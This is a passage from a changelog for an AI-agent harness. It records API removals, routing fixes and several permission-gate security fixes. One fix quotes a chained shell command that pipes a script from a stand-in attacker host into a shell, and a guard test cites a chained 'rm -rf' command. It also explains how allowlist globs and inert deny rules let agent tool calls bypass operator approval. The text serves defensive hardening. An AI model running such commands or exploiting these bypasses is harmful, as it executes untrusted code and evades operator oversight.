  `PromptSegment::cache_hint` in `conway-core`'s `segment` module, an
  unrelated, genuinely-read field that `conway-backends::anthropic::cache`
  consults to place breakpoints — that one stays.) Using the same method as
  `await_result`: `SubagentSpec` is never durably persisted (confirmed
  again for this field specifically — no `Event`, `SessionMeta`, or
  `LogRecord` carries `cache_hint`; the only whole-`SubagentSpec` holders
  outside call sites are in-memory test doubles), so this is a plain field
  removal on both `SubagentSpec` and the public facade's `ForkSpec`, not a
  legacy-deserialize change. (`crates/conway-core/src/agent.rs`,
  `crates/conway/src/subagent_spec.rs`, `crates/conway/src/session_handle.rs`,
  `crates/conway/src/intent.rs`, `crates/conway/src/conway.rs`,
  `crates/conway-runtime/src/subagent.rs`, `crates/conway-runtime/src/runtime.rs`,
  `crates/conway-tools/src/subagent/tools.rs`,
  `crates/conway-tools/src/subagent/ask.rs`)
- **Exit code 3 (`PermissionDenied`) is gone from the `conway -p`
  contract.** It was declared from the start but unreachable: a permission
  denial — of either kind — becomes a tool result fed back into the
  agent's own turn, never a terminal error, so no live path could ever
  produce it and a script branching on 3 had written a branch that never
  executes. The code is removed rather than wired because the premise is
  wrong for one-shot mode: the model sees the denial, may recover, and the
  run legitimately continues (a deny-mode script whose model only ever
  proposes tool calls runs until `limits.max_steps` and exits 5).
  `ExitCode::PermissionDenied` is deleted and 3 is unassigned; the denial
  remains observable as a `permission_resolved` envelope in the `jsonl`
  stream. (`crates/conway-cli/src/exit.rs`, `docs/scripting.md`)
- **`TruncationPolicy::Artifact` is gone.** It was documented as "spill the
  full output to an `Artifact`, keep a pointer in context," but nothing ever
  constructed it and the runtime (`apply_truncation`) handled it identically
  to `TruncationPolicy::None` — the inverse of the promise: a tool declaring
  it got no truncation at all, in the expensive direction. Removed rather
  than implemented: *where* to spill, *when*, the retention/cleanup policy,
  and whether the preview is head/tail/summary are workload-specific
  opinions this project puts in a hook or plugin, not in this enum. `ToolOutput::
  artifacts` and `Artifact` already give a plugin the type surface to report
  a spilled file; the participant point that would let a plugin *narrow*
  another tool's output before it reaches context does not exist yet
  (`.design/extension-architecture.md` §16.5 tracks the gap). (`crates/conway-core/src/content.rs`,
  `crates/conway-runtime/src/tools/runner.rs`,
  `crates/conway/tests/enum_variant_construction_guard.rs`)

- **BREAKING: the `conway` crate's `anthropic` and `openai-compat` cargo
  features are gone.** Which backend you talk to (native Anthropic, or one
  of the OpenAI-compatible dialects) is runtime configuration — a
  `backends.<id>.kind` entry in settings — not a build-time choice, and
  these two features were the wrong axis for it: every combination of the
  workspace's own `feature-matrix.yml` job that had neither feature enabled
  failed to compile (`conway_backends::profile::ProfileStore` referenced
  ungated in `builder.rs`), and had been red since before the 0.7.0
  release. `conway-backends` is now a plain, non-optional dependency of
  `conway` (built with its own default features, i.e. both adapters); the
  harness always ships both common API flavours, matching what
  `docs/providers.md` already documented as always-available `kind`s. **Any
  downstream `Cargo.toml` that named `conway = { ..., features =
  ["anthropic"] }` or `["openai-compat"]` will fail to resolve** — drop the
  feature list entirely (or keep only `builtin-tools`/`jsonl-store`, which
  are unaffected and remain genuine, independently toggleable features).
  The `#[cfg(not(feature = "anthropic"))]`/`#[cfg(not(feature =
  "openai-compat"))]` stub functions that returned
  `ConwayError::UnsupportedFeature` for a disabled backend are deleted
  outright, not left behind as dead code for a state that can no longer
  occur — that variant's sole remaining producer is
  `config::model_metadata::refresh` (`metadata-refresh`, unrelated, still a
  genuine no-op-until-implemented feature an earlier item). `feature-matrix.yml`
  is updated to the new truth (`--no-default-features`, `builtin-tools`
  alone, `jsonl-store` alone, both together, `--all-features`, default —
  six combinations, all now green) and its own guard was proven to still
  bite: a deliberately re-introduced ungated-caller/gated-callee mismatch
  (the exact shape of the original defect) makes the `no-default-features`
  job fail again, confirming the matrix is not a check that cannot fail.
  Running the full test suite (not just `cargo check`) under all six
  combinations — the matrix job itself only checks — surfaced two
  pre-existing, unrelated test-gating bugs the compile break had been
  hiding: `tests/conway_ask.rs` (needs `builtin-tools` for the
  `conway_ask`/`conway_subagent` tools it drives) and
  `tests/plugin_surface.rs`'s `plugin_tool_and_hook_register_through_the_builder`
  (needs `jsonl-store` for the default session store it never overrides,
  not `anthropic` — the feature it was actually, incorrectly, gated on).
  Both are now gated on the feature they actually depend on. This is a
  ground-clearing removal, not a replacement: backends as plugins,
  installed declaratively on the same surface a third-party plugin author
  uses, is filed separately as. (`crates/conway/Cargo.toml`,
  `crates/conway/src/builder.rs`, `crates/conway/src/error.rs`,
  `crates/conway/src/config/schema.rs`, `crates/conway/tests/builder.rs`,
  `crates/conway/tests/plugin_surface.rs`, `crates/conway/tests/conway_ask.rs`,
  `.github/workflows/feature-matrix.yml`, `ARCHITECTURE.md`,
  `docs/providers.md`)

- **The `STATUS` column is gone from `conway sessions list`/`sessions
  tree`, and `SessionStatus` is gone entirely.** A session has no terminal
  status, and this build never made it look like one honestly: only
  `SessionStatus::Active` was ever constructed anywhere in the workspace —
  the two points that could ever write a terminal status
  (`AgentLoop::finish`, the Supervisor's `Outcome::Synthesized`) never fire
  for a keep-alive session at all, which is exactly the case an operator
  most wants a status on, and `resume_root` never reset a stale value
  either. `SessionMeta::status`, `SessionFilter::status` (and the
  `SessionIndex`/`FakeSessionStore` filter clauses reading it), and the
  `SessionStatus` enum are all removed rather than left as dead-but-typed
  plumbing. **A session file written by an older build still loads** — the
  header's `status` key, if present, is now an unrecognized field that
  deserialization simply ignores, not a breaking change to the on-disk
  format. (`crates/conway-core/src/log.rs`,
  `crates/conway-session/src/meta.rs`, `crates/conway-session/src/index.rs`,
  `crates/conway-core/src/fakes.rs`,
  `crates/conway-cli/src/commands/sessions.rs`, `docs/sessions.md`)

### Fixed

- **An agent definition's `result_contract` frontmatter key is now
  enforced.** It parsed, compiled to a schema, and was stored on
  `AgentDef.result_contract`, but `subagent.rs`'s `SubagentHost::start` —
  which already applies a def's role, system prompt, tools, and model pin
  to a spawned child — never read it, so setting `result_contract` in a
  `.conway/agents/*.md` file bought nothing: the child's `structured` result
  was never validated against it. `start` now applies the def's
  `result_contract` as well, with a stated precedence rule: an explicit
  call-site contract (the model's `conway_subagent` `result_contract`
  argument, or an embedder's `ForkSpec`/`SpawnSpec::result_contract`) wins
  when both are set; the def's is the default used only when the call site
  left its own contract unset — mirroring how a def's `tools` selector
  already shadows, rather than merges with, a call-site override. Proven
  end to end through the real def-load path (a def file loaded from disk,
  not a hand-constructed `AgentDef`): a spawned child's undeclared
  `structured` output is retried once, then rejected, exactly like an
  explicitly call-site-declared contract already was.
  (`crates/conway-runtime/src/subagent.rs`,
  `crates/conway/tests/agent_defs.rs`,
  `crates/conway/tests/fixtures/agents/contract_child.md`, `docs/agents.md`)
- **The startup capability probe (`models.probe_on_startup`) can no
  longer make a model routable that `models.json` never declared.**
  `probe_openai_compat_backends` (`ConwayBuilder::build` step 5's overlay)
  inserted every probe-observed `(backend, model)` pair into the router's
  `CapabilityIndex` unconditionally, with no check against
  `metadata.models` — so an `openai-compat` server that listed a model the
  operator never wrote into `models.json` made that model silently
  routable, contradicting `probe.rs`'s own documented merge precedence
  (config `ModelOverrides` > `ModelMetadata` entry > probed server value >
  `DialectDefaults`, which discovery may only *narrow*, never use to admit
  a pair from nothing) and this project's own "no opaque auto-selection"
  rule. Per operator
  direction (RESTRICT, DECIDED: "keep configuration something done by
  hand and have the probe confirm that the model works, nothing else"),
  the overlay now drops any probed pair absent from `models.json` before
  it reaches the index — logged at `debug` so an operator relying on
  discovery still has a signal for why an expected model never became
  routable — rather than admitting it. This is operator-visible: such a
  pair now fails routing with the same `capabilities: unknown (backend,
  model) pair` error every other undeclared pair already gets, instead of
  being silently reachable. `docs/routing.md` and
  `docs/getting-started.md` now say so explicitly.
  (`crates/conway/src/builder.rs`,
  `crates/conway/tests/context_probe_overlay_seam.rs`, `docs/routing.md`,
  `docs/getting-started.md`)
- **`docs/routing.md` now documents how to see a model the startup probe
  observed but `models.json` never listed being dropped by the RESTRICT
  rule above.** That drop was previously logged only at `debug`, which
  most deployments do not run at, leaving no way to tell "the probe never
  reached my server" apart from "the probe saw it and RESTRICT dropped
  it" — an operator must always be able to answer that. No
  behavior changed; the doc now states the log level and gives the
  concrete `RUST_LOG=conway::builder=debug` invocation that surfaces it.
  (`docs/routing.md`)
- **`conway_ask`'s docs no longer claim an `agent_def` inheritance the
  code does not do.** The tool's module doc and its `prompt` argument's
  schema description both said a forked child "inherits this agent's full
  context, agent_def, role, and tool set" — false: `AskTool::invoke`
  always passes `agent_def: None`, so a def-declared `result_contract`,
  tools selector, system prompt, and model pin never reach a `conway_ask`
  child, even from a parent itself spawned from a def (only the parent's
  effective *role* is inherited, via `conway-runtime`'s existing
  fallback). This became load-bearing once agent-def `result_contract`
  enforcement landed (above): for `conway_ask` it silently never applies,
  and the docs previously implied otherwise. No behavior changed — the
  docs now say what the code actually does; whether a fork *should*
  inherit the forker's `agent_def` is an open design question, tracked
  separately. (`crates/conway-tools/src/subagent/ask.rs`, `docs/agents.md`)

- **`sessions list`'s `ORIGIN` column no longer prints `fork@...` for a
  spawned child.** `origin_cell` (and `origin_json`'s `--json` counterpart)
  hardcoded the word `fork` for any session with a parent, discarding the
  persisted `SessionMeta.origin.mode` that already distinguishes the two —
  so a session `conway_subagent` created in **spawn** mode (clean-slate, no
  inherited context) rendered identically to a **fork** (the parent's
  entire context inherited), contradicting the rule that fork and spawn are
  two separate concepts, never blurred into one operation, and this same
  page's own `docs/sessions.md`. Both the text cell and the JSON `origin`
  object now read the real mode (`fork@<seq> <parent>` /
  `spawn@<seq> <parent>`; `"mode": "fork"` / `"mode": "spawn"`).
  (`crates/conway-cli/src/commands/sessions.rs`,
  `crates/conway-cli/tests/subcommands.rs`, `docs/sessions.md`)

- **A scoped `--allowed-tools` glob entry no longer authorizes a
  chained shell command it wasn't written to match.** `AllowListGate::check`
  (one-shot mode's `allowlist` gate) matched a `tool_name(arg_glob)` entry's
  pattern with a raw `globset::Glob`, whose `*` matches shell
  metacharacters as readily as anything else — so `--allowed-tools
  'bash(git *)'`, read by an operator as "may run git commands," also
  silently authorized `git status; curl evil.com|sh` and equivalent `&&`/
  backtick-chained commands. `ArgMatcher::allows` (used only for **allowed**
  entries) now calls the same `conway_core::permission_pattern::
  contains_shell_metacharacters` check `PatternRule::matches_render` uses,
  in the same order — before the glob comparison, and only when the tool's
  `render_kind` is `ShellCommand` — so a metacharacter-carrying value never
  matches a glob entry. **A bare `tool_name` entry (`--allowed-tools
  bash`) is deliberately unaffected**: it already grants that tool
  unrestricted access (this is the documented, default path), so gating it
  would reject every documented example for zero security gain. A
  **denied** `tool_name(arg_glob)` entry is also unaffected, mirroring
  `PatternRule::matches_deny`'s own asymmetry: a deny match must stay hard
  to evade regardless of what the value contains. The `tool_name(arg_glob)`
  scoping syntax itself — previously discoverable only from
  `AllowListGate`'s rustdoc and its test suite — is now documented in
  `docs/scripting.md` alongside `--allowed-tools`/`--deny-tools`.
  (`crates/conway/src/gates.rs`, `crates/conway/tests/gates.rs`,
  `docs/scripting.md`)

- **`probe_on_startup` no longer overrides a `models.json`-configured
  `max_context_tokens`/`reliability_tier` in the router's own capability
  index.** `ConwayBuilder::build`'s startup probe step
  (`probe_openai_compat_backends`) used to construct each backend's
  `CapabilityProbe` with an empty overrides table instead of the same
  `models.json`-derived one the backend itself was built with, so a probed
  server window could silently overwrite an operator's explicit
  `models.json` entry in the router's `CapabilityIndex` — in either
  direction: a wider probed window let the router admit requests the
  operator's configured window should have rejected, and a narrower one
  made the router reject candidates the operator had declared adequate,
  even though `Backend::capabilities()` (and therefore the runtime's T-1
  gate) still honored the correct, operator-configured value the whole
  time. `models.json` now wins outright, in both directions, for every
  model it lists — restoring the precedence `docs/routing.md`'s "Capability
  matching" section already documented. Oversized-context rejection for a
  `models.json`-listed model now happens at routing time, with the
  operator-configured window, not later via the runtime's T-1 backstop.
  (`crates/conway/src/builder.rs`,
  `crates/conway/tests/context_probe_overlay_seam.rs`,
  `docs/providers.md`)

- **A `command_prefix` rule on a `Structured`-rendering tool was silently
  inert for every select shape except a single named tool.** The original
  `CommandPrefixOnStructuredTool` registration check matched only
  `Select::Tools` with exactly one tool, so a `command_prefix` rule that
  selected a `Structured`-rendering tool through a multi-tool list, a
  trailing-`*` wildcard, or a `Select::Categories` installed silently inert
  — the `68ea9b1` `read:*`-matched-nothing bug, re-opened for the structured
  select shapes the original check never reached. The check now resolves the
  `select` against the registered tools (via the new
  `PluginRegistry::tools_metadata` enumeration + `Rule::select_matches`, so
  exact names, trailing-`*` wildcards, and categories are all covered) and
  counts `Structured`- vs `ShellCommand`-rendering members: an
  **all-Structured** select (single-tool, multi-tool, wildcard, or category —
  every resolvable member is `Structured`) is a hard
  `CommandPrefixOnStructuredTool` registration error surfaced to the
  operator via `registration_errors`, exactly as the single-tool case
  already was; a **mixed-kind** select (at least one `Structured` and at
  least one `ShellCommand` member, e.g. `{"tools":["bash","read"]}`) installs
  — the `ShellCommand` members work, and rejecting the whole rule would
  discard them — and surfaces a NOTICE (the new `TrustPermissionReport::notices`
  field, surfaced in the TUI trust path) naming the inert `Structured`
  members so the operator can split the rule; a no-Structured select is
  clean. Unknown tools (a name no registered tool answers to, e.g. a plugin
  tool loaded later) are skipped, not errored — a load-order hazard is not a
  misconfigured rule (mirroring the single-tool check's `None` arm). The
  `PathsUnder` arms (B1 `PathsUnderOnUnconfinedTool`, B3
  `PathsUnderPrefixUncanonicalizable`) are unchanged. Liveness is proven by
  four real-stack break-the-guard cycles (every guard's test must be
  able to fail), one per guard, each neutralized → confirmed FAIL → restored
  → confirmed green, with the verbatim failing output recorded in the work
  item:

  - *Guard (i)* — `paths_under_match`'s `PathArgs::Unconfinable { .. } =>
    return false` arm (`crates/conway-runtime/src/permission.rs`):
    `an_unconfinable_tool_never_satisfies_paths_under_so_bash_reaches_the_gate`
    FAILED with `left: 0, right: 1` (a `paths_under` allow rule on `bash`
    auto-allowed `echo hi` instead of reaching the gate) when the arm was
    flipped to `return true`.
  - *Guard (ii)* — the `resolve_like_the_tool_will` + containment path in
    `paths_under_match` (reads `call.arguments`, never the lossy `rendered`):
    `a_paths_under_rule_reads_arguments_not_rendered_so_a_traversal_path_reaches_the_gate`
    FAILED with `left: 0, right: 1` when the resolve+contain logic was
    replaced with a naive `rendered.contains(root)` substring check (the
    rendering-bypass the test pins against — the traversal's rendered string
    contains the prefix, so a rendered-based check falsely matched and
    auto-allowed an out-of-root read).
  - *Guard (iii)* — `validate_rule_registration`'s `CommandPrefix` arm
    (early-returns the typed error for an all-Structured select):
    `command_prefix_on_a_structured_tool_is_a_registration_error` FAILED
    with `left: 0, right: 1` (zero registration errors instead of one) when
    the arm was made to early-`return None` (the B1/B3 arms were kept).
  - *Guard (iv)* — `Rule::gate_allows` in
    `crates/conway-core/src/permission_pattern.rs` (the allow-side
    metacharacter gate):
    `flat_and_structured_command_prefix_produce_byte_identical_gate_decisions`
    FAILED with `left: 0, right: 1` on the `chained == 1` assertion (the
    chained command `git status && rm -rf /tmp/x` auto-allowed under the
    matching prefix instead of reaching the gate) when `gate_allows` was
    made to always return `true`.

  No liveness bug was found — every guard's test failed when its guard was
  neutralized and passed once restored. Pinned by six new real-stack seam
  tests in `crates/conway/tests/structured_rule_seam.rs` (an untrusted
  project structured `allow` rule held for trust; the broadened
  all-Structured hard error for multi-tool, wildcard, and category selects;
  a mixed-kind select that installs with a notice; and a B1/B3 regression
  guard proving the broadening does not collide with the `PathsUnder`
  arms). (`crates/conway/src/conway.rs`,
  `crates/conway-runtime/src/tools/registry.rs`,
  `crates/conway-runtime/src/runtime.rs`,
  `crates/conway-cli/src/tui/app.rs`,
  `crates/conway/tests/structured_rule_seam.rs`, `docs/permissions.md`)

- **A plugin-contributed `then: "allow"` rule is now refused at the broker
  boundary.** An `allow` rule is a durable grant of authority, and grants
  belong to the operator, not to code the operator did not write — but the
  broker had no structural guard against a plugin-contributed allow rule:
  the "allow is operator-owned" invariant (`.design/extension-architecture.md`
  §5.5 stage 1) rested on the absence of a plugin transport, so a future
  transport that reused the allow path with a plugin origin would silently
  install a grant the operator never authorized. A new
  `PatternOrigin::Plugin` variant plus a structural guard in
  `PermissionBroker::remember_pattern_rule` refuses a `PatternOrigin::Plugin`
  rule with `Then::Allow` with a typed `false` (never a panic — the
  same rejection shape the other `remember_*_rule` callers already honor),
  so the rule never enters the active allow store regardless of which
  transport contributed it. Plugin `deny`/`prompt` rules are NOT refused
  here — narrowing rules install unconditionally (the corollary the
  invariant depends on) — so the refusal is specific to the
  `PatternOrigin::Plugin` + `Then::Allow` pair, not a blanket `Plugin`
  rejection. Liveness is proven by a unit test in
  `crates/conway-runtime/tests/permission_broker.rs` asserting a plugin
  allow rule is refused (`remember_pattern_rule` returns `false`,
  `active_structured_allow_rules` stays empty) and a plugin deny rule
  installs. (`crates/conway-core/src/permission_pattern.rs`,
  `crates/conway-runtime/src/permission.rs`,
  `crates/conway-runtime/tests/permission_broker.rs`, `docs/permissions.md`)

- **A `paths_under` rule whose prefix FAILS to canonicalize (a typo, or a
  repo/subdirectory not yet cloned/checked out) was silently dropped, and
  `/trust permissions` could report a false install count.** The
  `install_allow_rule`/`install_deny_rule`/`install_prompt_rule` facade
  helpers discarded the `bool` returned by `PermissionBroker::remember_*_rule`,
  so when `CanonicalRoot::new(prefix)` failed inside `canonicalize_when`
  (the prefix does not resolve on disk) the broker returned `false` and the
  rule was not installed — but nothing reached `registration_errors`, so the
  operator was never told. For `then: deny`/`prompt` the hazard is sharpest:
  the operator believed a `paths_under` deny was protecting them when it was
  never installed (fail-OPEN against the operator's expectation). The
  `/trust` path had the same lie PLUS a false count: `trust_permission_file`'s
  `count += 1` was unconditional, so `/trust permissions` reported "1 allow
  rule(s) installed" for a rule the broker dropped as uncanonicalizable. The
  loader now honors the install `bool` in every arm (allow/deny/prompt) and
  surfaces a typed `RuleRegistrationReason::PathsUnderPrefixUncanonicalizable`
  registration error (visible to the operator via the same
  `registration_errors` → transcript-error channel the other registration
  errors use) when a `paths_under` prefix fails to canonicalize.
  `trust_permission_file` now returns a `TrustPermissionReport` carrying
  both the count of rules ACTUALLY installed and the same
  `registration_errors`, so a dropped rule is neither counted nor silent on
  the trust path. The rule is still fail-closed: a matching call is not
  auto-allowed/denied by an inert rule — it reaches the operator's gate,
  the honest outcome. Distinct from the `PathsUnderOnUnconfinedTool` fix
  above: that fires when the prefix canonicalizes fine but the selected
  tool's `PathArgs` can never be confined; this fires when the prefix itself
  cannot be canonicalized, regardless of the tool. Pinned by three real-stack
  seam tests in `crates/conway/tests/structured_rule_seam.rs` — one for the
  allow arm (registration error + the call reaches the gate), one for the
  deny and prompt arms (each surfaces its own error), and one for the
  `/trust` path (the dropped rule is not counted and the operator is
  informed) — all verified to fail when the surfacing is neutralized.
  (`crates/conway-core/src/permission_pattern.rs`,
  `crates/conway/src/conway.rs`, `crates/conway-cli/src/tui/app.rs`,
  `crates/conway/tests/structured_rule_seam.rs`, `docs/permissions.md`)

- **A `paths_under` `deny`/`prompt` rule on an `Unconfinable` tool (e.g.
  `bash`) was silently inert — fail-OPEN.** `paths_under_match` returns
  `false` for `PathArgs::Unconfinable` and `PathArgs::None` (correct for
  `allow`, where inertness fail-closes by falling through to the gate), and
  `rule_denies_or_prompts` reused that predicate unchanged for the
  deny/prompt path — so
  `{ "select": { "tools": ["bash"] }, "when": { "paths_under": "/secret" }, "then": "deny" }`
  installed with no error and could never match, letting the bash call the
  operator expected to be refused go through. The loader now refuses to
  install such a `deny`/`prompt` rule silently and surfaces a typed
  `RuleRegistrationReason::PathsUnderOnUnconfinedTool` registration error
  (visible to the operator via the `registration_errors` → transcript-error
  channel at load time) when a `paths_under` deny/prompt rule's `Select::Tools`
  contains any exactly-named tool whose resolved `PathArgs` is not `Named`.
  A `Select::Categories` (whose member tools may register after the rule is
  loaded) and a trailing-`*` wildcard are not inspectable at load time, so
  for those the broker fail-closes at decision time: an `Unconfinable` tool
  matching the select under a `paths_under` `deny`/`prompt` rule is refused,
  never silently allowed. `then: allow` is unchanged (inertness there is
  fail-closed, not a registration error). Pinned by two real-stack seam
  tests in `crates/conway/tests/structured_rule_seam.rs` — one asserting the
  install-time registration error for `Select::Tools(["bash"])`, one
  asserting the decision-time refusal for `Select::Categories(["execute"])`
  — both verified to fail when their guard is neutralized.
  (`crates/conway-core/src/permission_pattern.rs`,
  `crates/conway-runtime/src/permission.rs`,
  `crates/conway-runtime/src/runtime.rs`,
  `crates/conway/src/conway.rs`,
  `crates/conway/tests/structured_rule_seam.rs`, `docs/permissions.md`)

- **A relative `paths_under` prefix resolved against the process's cwd, not
  the project — a rule like `"src"` in a project `permissions.json`
  silently pointed at `~/src` when conway was launched from your home
  directory.** `canonicalize_when` canonicalized the prefix with a bare
  `Path::canonicalize`, whose base for a relative path is the process's
  current directory at launch — so the operator believed a path was
  protected when the rule in fact confined (or failed to confine) a tree
  they never wrote a rule for. Every other relative root in conway
  (`RootSpec.root`, `SubagentSpec.root`) resolves against the project;
  `paths_under` was the odd one out. The base is now threaded explicitly
  from the loader that knows which file the rule came from:
  `Conway::load_permission_files`/`trust_permission_file` compute it
  (`<project>/.conway/permissions.json` → the project root; the global file,
  which has no containing project, → the agent's working directory at load
  time) and pass it through `install_*_rule` to the broker's
  `remember_*_rule`, which resolves the prefix via the same
  `resolve_like_the_tool_will` helper the per-call check uses — no third
  copy of the resolution rule, and no implicit `current_dir` read inside
  the broker. Absolute prefixes are byte-for-byte unchanged, and the stored
  `Rule` keeps its relative prefix verbatim (the review surface shows, and
  a revoke addresses, exactly what the file says). Pinned by a real-stack
  seam test that loads a project file with `paths_under: "src"` through the
  genuine `/trust permissions` path and asserts both halves of the
  boundary: a read under the project's `src/` is authorized without the
  gate, and the same-named path under the process cwd reaches it —
  verified to fail when the base resolution is neutralized.
  (`crates/conway-runtime/src/permission.rs`,
  `crates/conway/src/conway.rs`,
  `crates/conway/tests/structured_rule_seam.rs`, `docs/permissions.md`)

- **Exit code 4 (`NoHealthyBackend`) was also declared but unreachable —
  it is now wired, and routing rejections exit 4.** A routing failure
  mid-turn never reached the CLI's exit classifier: the agent loop folds
  every terminal `RuntimeError` into `ResultStatus::Failed`
  (`AgentLoop::finish_error`), and `ExitCode::from_result` mapped every
  `Failed` to 1 (`AgentFailed`), so `--role-override doesnotexist`, a
  `models.json` missing the routed pair, and a dead backend all exited 1
  while the unit-tested `NoCandidate` → 4 mapping sat with no live caller.
  `from_result`'s `Failed` arm now runs the same classifier `from_error`
  already used, over the failure text the runtime actually produces —
  which carries the `RoutingError`'s `Display` wording verbatim (pinned by
  new `conway-core` tests so an upstream wording change fails loudly
  there). Every routing rejection is treated coherently as 4: an unknown
  role, no admissible candidate, and `RoutingError::ContextTooLarge`
  (which `DeclarativeRouter` now returns when every candidate failed
  solely on headroom) are the same outcome from a script's side — routing
  could not supply any model, so nothing could proceed. Each shape has an
  integration test that drives the real `conway` binary and asserts the
  observed process exit status. (`crates/conway-cli/src/exit.rs`,
  `crates/conway-cli/tests/oneshot.rs`,
  `crates/conway-core/src/error.rs`, `docs/scripting.md`)

- **An oversized request could be rejected with an error that named none of
  the numbers a caller needs to act on it — no input token count, no headroom, no
  window.** `conway_core::ports::Router::resolve`'s own doc contract says
  the headroom gate (T-1) returns `RoutingError::ContextTooLarge` (which
  carries `est_tokens`/`headroom_tokens`/`required_tokens`/
  `max_context_tokens`/`shortfall_tokens` as structured fields), but the
  only committed implementation, `DeclarativeRouter`, folded every
  all-rejected outcome — headroom included — into `RoutingError::NoCandidate`
  instead, whose shortfall detail survived only as unstructured prose buried
  in a `String`. Since the headroom gate runs on every route T-0 already
  admitted, `NoCandidate` was the error an operator actually saw for an
  oversized context with a correctly configured chain. `resolve` now
  returns `ContextTooLarge` — naming the largest window among every
  candidate considered — exactly when every candidate was rejected and each
  one *solely* on headroom; a candidate that also fails some other
  requirement (a missing capability, a health-open breaker) is a mixed
  failure not attributable to context size alone, so that case still falls
  back to `NoCandidate` unchanged. This also revives a dead code path:
  `AgentLoop::route_and_attempt`'s `ContextHook::on_overflow` retry was
  reachable only via `AttemptEngine`'s own backstop gate before this change,
  since a bare `NoCandidate` from the router short-circuited past it —
  a registered overflow hook now actually gets a chance on the router path
  too. (`crates/conway-routing/src/router.rs`,
  `crates/conway-routing/src/explain.rs`,
  `crates/conway-runtime/src/agent_loop.rs`,
  `crates/conway-runtime/src/attempt.rs`,
  `crates/conway-routing/tests/router_resolution.rs`,
  `crates/conway-routing/tests/explain_report.rs`, `docs/routing.md`)

- **`docs/scripting.md` promised `jsonl` consumers a global contract the
  stream already breaks in any multi-agent run.** It claimed `seq` was
  monotonically increasing and gap-free across the whole stream, and that
  exactly one `agent_finished` marked the end. Both are false the moment a
  session spawns a subagent (`conway_subagent`/`conway_ask`): the child's
  lifecycle lines (`agent_spawned`/`agent_finished`/`agent_promoted`)
  deliberately cross the session filter stamped with the *child's own*
  session/agent id and its own, independent `seq` counter, so global `seq`
  can go backward at the junction and a mid-stream `agent_finished` belongs
  to the child, not the run's end — a consumer that broke on the first
  `agent_finished` would truncate the run and lose the root's own final
  answer. The doc now states the four-part contract the stream actually
  guarantees: `seq` is strictly increasing only *within* a session; the
  root session's own lines are gap-free from 0 (barring a lagged run);
  other sessions surface only as sparse lifecycle slices; and the stream
  ends at the `agent_finished` whose agent is the root agent, not the
  first one. The stream's cross-session passthrough itself is unchanged —
  this is a documentation and test correction only.
  (`docs/scripting.md`, `crates/conway-cli/tests/oneshot.rs`,
  `crates/conway-cli/src/render/jsonl.rs`)

## [0.7.0] — 2026-07-31

Five security fixes and one cost fix, all found by reading the code against the
documentation that described it rather than by anything failing in use.

The recurring shape: a capability declared, documented, and never reached. Four
of the six were mechanisms that existed in full and were simply never called —
pattern grants inert for twelve of thirteen tools, `cache_control` never
emitted, a startup hook with no call sites, and a rule effect with no step in
the decision pipeline. Each had passing unit tests; none had a test asserting
the mechanism was live.

Every fix in this release ships with a test that drives a production entry point
and was verified to fail when the guard is removed.

### Added

- **A root agent can now be confined to a filesystem root — `--root`
  (`ConwayBuilder::with_root`).** The chroot-analogue primitive
  (`AgentRoot`/`CanonicalRoot`/`PermissionBroker::check_root`) already
  existed and was already checked first, above every allow path — but
  `RootSpec` had no `root` field, so `AgentRoot::reconstruct` always
  produced `Unconfined` for the ROOT agent of every session (only a
  spawned/forked child could ever be confined). The agent an operator
  actually talks to could not be confined. `--root <DIR>` (paired with, and
  deliberately distinct from, `--cwd` — cwd is where the agent works, root
  is what it may reach; see each flag's own `--help` text) closes that gap:
  `Runtime::start_root` now resolves and validates the requested root
  exactly like a spawned child's (must canonicalize, `cwd` must already fall
  inside it), and a spawned/forked child's own root still narrows only,
  never widens, against its now-possibly-confined parent. Default
  (`--root` absent) is unchanged: `Unconfined`, byte-for-byte, for every
  existing invocation. Consequently, `must_reach_gate` is now reachable for
  a root agent too: an `Unconfinable` tool (e.g. `bash`'s own `command`)
  under a configured root always reaches the operator's gate, never
  auto-allowed — the property `.design/extension-architecture.md`
  §5.1/§7.5 count on, previously true only vacuously for a root agent.
  (`crates/conway-runtime/src/runtime.rs`, `crates/conway/src/builder.rs`,
  `crates/conway/src/conway.rs`, `crates/conway-cli/src/cli.rs`,
  `crates/conway-cli/src/main.rs`, `crates/conway/tests/root_containment_seam.rs`)

- **Declarative provider profiles.** Per-provider wire behavior (chat path,
  `stream_options`, multi-block user content, `parallel_tool_calls`,
  `max_completion_tokens` vs `max_tokens`, `reasoning_effort`, tool-call
  parsing strategy) and baseline capabilities are now data
  (`conway_backends::profile::Profile`), not a fixed `Dialect` match arm.
  The five existing dialects (`openai`, `ollama`, `vllm_hermes`,
  `lm_studio`, `llama_cpp_server`) are embedded as built-in profiles with
  byte-identical behavior to before; `Dialect` itself is unchanged and
  still works everywhere it did. A new provider — including the **Moonshot
  Kimi platform API** (`kimi`, distinct from the already-shipped Kimi Code
  Anthropic-compatible path) — is added as profile data, no code change or
  recompile required. A user can add their own profile via
  `.conway/profiles.toml` (project-scoped, then global — the same
  discovery layering as permission rules) and list every loaded profile
  with its origin (`ProfileStore::list`); an override is always visible,
  never silent. `docs/crates/conway-backends.md` documents the format, the
  built-ins, and how to add one. (`crates/conway-backends/src/profile.rs`,
  `crates/conway-backends/src/tool_calls/mod.rs`, `crates/conway/src/builder.rs`,
  `crates/conway/src/config/discovery.rs`)

- **`cached_tokens` now reads either wire shape a provider sends.** OpenAI
  nests it under `usage.prompt_tokens_details.cached_tokens`; Kimi's
  Moonshot platform API reports it at the top level, `usage.cached_tokens`.
  `openai_compat::wire::map_usage` now reads whichever is present (nested
  wins if a server sends both), so prompt-cache accounting is correct for
  both shapes with no per-provider flag.
  (`crates/conway-backends/src/openai_compat/wire.rs`)

- **Per-rule permission revocation in `/settings`.** Every active pattern
  grant is now a real, selectable menu row (`Conway::revoke_permission_pattern`)
  instead of inert label text — `Enter` on a row revokes exactly that grant,
  addressed by the same `(PatternRule, PatternOrigin)` pair the row
  displays (never a positional index, which could shift under a concurrent
  grant). Revocation never fails open: the broker drops the in-memory grant
  first, unconditionally, before any file write is attempted. An
  `Interactive`-origin grant (no backing file) writes nothing on revoke; a
  file-origin grant is removed from **that exact file** via
  read-modify-write, tmp-then-rename, and — if the file is a trusted
  project file — its trust is **re-recorded for the rewritten content**
  immediately after, so revoking one rule never silently de-trusts the
  file's other rules. A write that fails is reported honestly
  (`RevokeOutcome::RevokedButPersistFailed`) rather than folded into a
  false "done"; the rule still stops applying for the session either way.
  `deny` rules are not revocable through this surface at all — `/settings`
  never lists them, mirroring `revoke_all_grants`'s existing choice to
  leave `deny` untouched. Revoke-all remains available alongside per-rule
